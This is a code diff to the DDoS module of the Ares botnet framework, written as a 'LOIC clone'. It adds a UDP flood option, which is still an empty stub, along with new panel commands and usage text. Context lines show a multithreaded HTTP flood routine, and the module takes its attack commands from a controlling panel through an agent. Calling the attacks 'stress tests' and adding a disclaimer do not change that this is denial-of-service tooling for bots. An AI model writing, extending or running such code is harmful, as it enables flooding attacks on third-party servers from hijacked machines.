@@ -1,8 +1,10 @@
-# Ares HTTP-DDoS Module (LOIC Clone)
+# Ares DDoS Module (LOIC Clone) + Layer 4 Socket based Attacks (UDP)
 # Pythogen
-# Build 1.2
+# Build 1.3
+
 
 # Not intended for illegal uses.
+
 
 # 12/27/2015 - 4:34 PM - Bug fix: DDoS completion notice now correctly synchronized.
 
@@ -12,11 +14,25 @@
 
 # 12/29/2015 - 2:58 PM - Update: Informs when every thousand requests have been sent until completion. (Panel Feedback)
 
-# Panel commands:
+# 1/10/2016  - 1:46 AM - Update: Refining Commands and including UDP Stress test option.
 
-# ddos http://[host]/ [requests]
-# ddos http://something.com/ 10000
-# ddos stop 0
+
+# Panel Command Format:
+
+# ddos http://[host]/ [Attack Type] [requests] - [!] Important to include 'http://' in HTTP type attack
+# ddos [URL] HTTP [requests]
+# ddos [IP] UDP [requests]
+
+# Examples:
+
+# HTTP Stress Test:
+# ddos http://something.com/ HTTP 10000
+
+# UDP Stress Test
+# ddos 11.22.33.44 UDP 10000
+
+# Deactive All Tests
+# ddos stop ALL 0
 
 # Make sure to include 'ddos' in MODULES array in agent.py
 
@@ -95,7 +111,7 @@ def auto_send_request(server, number_of_requests=10):
 
                 
 
-# Flood routine
+# Flood routine [HTTP Stress Testing]
 def flood(url, number_of_requests = 1000, number_of_threads = 50):  
     number_of_requests_per_thread = int(number_of_requests/number_of_threads)
     try:
@@ -110,7 +126,7 @@ def flood(url, number_of_requests = 1000, number_of_threads = 50):
 
 # - Command control -
 
-def run(action, num_req):    
+def run(action, dtype, num_req):    
     # Globalize variables
     global requests
     global inc
@@ -123,8 +139,11 @@ def run(action, num_req):
     isDos = False
 
     # If command passed is not 'stop' then it's a host
-    if action != "stop":
-        utils.send_output("DDoS Started.")
+
+    # Start [HTTP Stress Test]
+    if action != "stop" and dtype == "HTTP":
+
+        utils.send_output("HTTP-DDoS Started.")
         
         # Boolean value that determines if stresser is active
         isDos = True
@@ -138,25 +157,44 @@ def run(action, num_req):
         # Call function to begin attack
         flood(server, requests)
 
+    # Start [UDP Stress Test]
+    elif action != "stop" and dtype == "UDP":
 
-    # Halt process
-    elif action == "stop":
+        utils.send_output("UDP-DDoS Started.")
+        # Code to be included soon...
+
+    # Halt Active Sessions
+    elif action == "stop" and dtype =="ALL":
 
         # Turn it off
         isDos = False
-        utils.send_output('DDoS Stopped.')
+        utils.send_output('All DDoS Sessions Deactivated.')
+
     else:
 
         # Display current commands
-        utils.send_output("Usage: DDoS [host] [requests]|stop 0")
+        utils.send_output("Usage: ddos [host] [Attack Type] [requests] | stop ALL 0")
 
 
 
 def help():
     # Help command details
     help_text = """
-    Usage: ddos [host] [requests]|stop 0
-    HTTP-DDoS.
+    Usage: 
+
+    HTTP Stress Test:
+
+    Format [HTTP]:
+    ddos http://[host]/ [Attack Type] [requests]
+
+    HTTP Stress Start:
+    ddos http://something.com/ HTTP 10000
+
+    UDP Stress Start:
+    ddos 11.22.33.44 UDP 10000
+
+    Stop:
+    ddos stop ALL 0
 
     """
     return help_text
